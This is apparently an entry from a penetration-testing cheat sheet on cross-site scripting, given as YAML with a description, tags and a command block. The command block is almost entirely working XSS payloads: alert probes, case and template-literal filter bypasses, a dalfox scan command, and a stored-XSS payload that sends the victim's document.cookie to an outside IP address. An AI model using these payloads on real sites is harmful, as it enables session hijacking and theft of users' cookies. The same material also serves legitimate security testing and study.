---
description: |
  Cross-Site Scripting (XSS) attacks — reflected, stored, and DOM-based XSS for cookie theft, session hijacking, and filter bypass techniques.
command: |
  # Reflected XSS test
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>

  # Cookie stealing (stored XSS)
  <script>document.location='http://10.10.10.21/?c='+document.cookie</script>

  # Filter bypass
  <ScRiPt>alert(1)</ScRiPt>
  <script>alert`1`</script>

  # DOM XSS — check: document.write(), innerHTML, eval()

  # Tools
  dalfox url "http://10.10.10.27/page?q=test"
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - XSS
references:
  - https://owasp.org/www-community/attacks/xss/
  - https://portswigger.net/web-security/cross-site-scripting
---
